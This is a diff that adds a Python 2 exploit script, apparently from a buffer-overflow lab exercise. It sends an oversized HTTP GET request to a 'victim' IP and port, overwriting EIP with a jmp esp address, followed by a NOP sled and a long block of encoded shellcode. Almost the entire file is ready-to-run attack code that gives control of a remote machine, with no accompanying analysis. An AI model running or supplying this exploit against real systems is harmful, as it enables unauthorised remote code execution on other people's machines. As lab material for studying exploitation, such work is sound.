@@ -1,0 +1,97 @@
+#!/usr/bin/python
+
+
+
+import sys
+import argparse
+import socket
+
+
+# user input
+program_description = "The program inputs ip and port of the victim pc"
+parser = argparse.ArgumentParser(program_description)
+parser.add_argument("target_ip", help="Target IP")
+parser.add_argument("target_port", type=int, help="Target Port")
+parser.add_argument("eip_offset", type=int, help="Eip offset at the moment of crash")
+args = parser.parse_args()
+
+# global parameters
+user_input = (args.target_ip, args.target_port, args.eip_offset)
+
+
+# function definitions
+def buffer_gen(eip_offset):
+    buf = 'GET '
+    buf = buf + 'A' * eip_offset
+    
+    # adding the eip (memory of jmp esp)in format: reverse order due to endianess
+    eip = "\xA4\x23\x49\x7E"
+    buf = buf + eip
+
+    # adding the eip and no-op padding
+    noop = "\x90" * 20                  # 5 layer padding
+    buf = buf + noop
+
+    # adding payload
+    buf += "\xdb\xde\xd9\x74\x24\xf4\x5b\x33\xc9\xba\x87\x60\xc9"
+    buf += "\x8c\xb1\x53\x31\x53\x17\x03\x53\x17\x83\x44\x64\x2b"
+    buf += "\x79\xb6\x8d\x29\x82\x46\x4e\x4e\x0a\xa3\x7f\x4e\x68"
+    buf += "\xa0\xd0\x7e\xfa\xe4\xdc\xf5\xae\x1c\x56\x7b\x67\x13"
+    buf += "\xdf\x36\x51\x1a\xe0\x6b\xa1\x3d\x62\x76\xf6\x9d\x5b"
+    buf += "\xb9\x0b\xdc\x9c\xa4\xe6\x8c\x75\xa2\x55\x20\xf1\xfe"
+    buf += "\x65\xcb\x49\xee\xed\x28\x19\x11\xdf\xff\x11\x48\xff"
+    buf += "\xfe\xf6\xe0\xb6\x18\x1a\xcc\x01\x93\xe8\xba\x93\x75"
+    buf += "\x21\x42\x3f\xb8\x8d\xb1\x41\xfd\x2a\x2a\x34\xf7\x48"
+    buf += "\xd7\x4f\xcc\x33\x03\xc5\xd6\x94\xc0\x7d\x32\x24\x04"
+    buf += "\x1b\xb1\x2a\xe1\x6f\x9d\x2e\xf4\xbc\x96\x4b\x7d\x43"
+    buf += "\x78\xda\xc5\x60\x5c\x86\x9e\x09\xc5\x62\x70\x35\x15"
+    buf += "\xcd\x2d\x93\x5e\xe0\x3a\xae\x3d\x6d\x8e\x83\xbd\x6d"
+    buf += "\x98\x94\xce\x5f\x07\x0f\x58\xec\xc0\x89\x9f\x13\xfb"
+    buf += "\x6e\x0f\xea\x04\x8f\x06\x29\x50\xdf\x30\x98\xd9\xb4"
+    buf += "\xc0\x25\x0c\x20\xc8\x80\xff\x57\x35\x72\x50\xd8\x95"
+    buf += "\x1b\xba\xd7\xca\x3c\xc5\x3d\x63\xd4\x38\xbe\x9a\x79"
+    buf += "\xb4\x58\xf6\x91\x90\xf3\x6e\x50\xc7\xcb\x09\xab\x2d"
+    buf += "\x64\xbd\xe4\x27\xb3\xc2\xf4\x6d\x93\x54\x7f\x62\x27"
+    buf += "\x45\x80\xaf\x0f\x12\x17\x25\xde\x51\x89\x3a\xcb\x01"
+    buf += "\x2a\xa8\x90\xd1\x25\xd1\x0e\x86\x62\x27\x47\x42\x9f"
+    buf += "\x1e\xf1\x70\x62\xc6\x3a\x30\xb9\x3b\xc4\xb9\x4c\x07"
+    buf += "\xe2\xa9\x88\x88\xae\x9d\x44\xdf\x78\x4b\x23\x89\xca"
+    buf += "\x25\xfd\x66\x85\xa1\x78\x45\x16\xb7\x84\x80\xe0\x57"
+    buf += "\x34\x7d\xb5\x68\xf9\xe9\x31\x11\xe7\x89\xbe\xc8\xa3"
+    buf += "\xba\xf4\x50\x85\x52\x51\x01\x97\x3e\x62\xfc\xd4\x46"
+    buf += "\xe1\xf4\xa4\xbc\xf9\x7d\xa0\xf9\xbd\x6e\xd8\x92\x2b"
+    buf += "\x90\x4f\x92\x79"
+    
+    buf = buf + ' HTTP/1.1\r\n\r\n'
+    return buf
+
+def socket_setup(ip, port):
+    # socket creatation
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   
+   # connecting
+    s.connect((ip, port))
+    return s
+
+def main(input_tuple):          # Input tuple has the following structure: (ip, port, eipOffset)
+    s = socket_setup(input_tuple[0], input_tuple[1])
+    buf = buffer_gen(input_tuple[2])
+
+    print "sending buffer: ", buf
+    s.send(buf)
+
+    try:
+#        recv = s.recv(1024)
+#        print "server says: ", recv
+        
+        while 1:
+            pass
+    except KeyboardInterrupt:
+        print "\n[!] Closing Exploit"
+        s.close()
+        sys.exit(0)         # gracefully exits upon ctrl-c
+
+# script execution
+if __name__ == "__main__":
+    main(user_input)        # calling main function
+
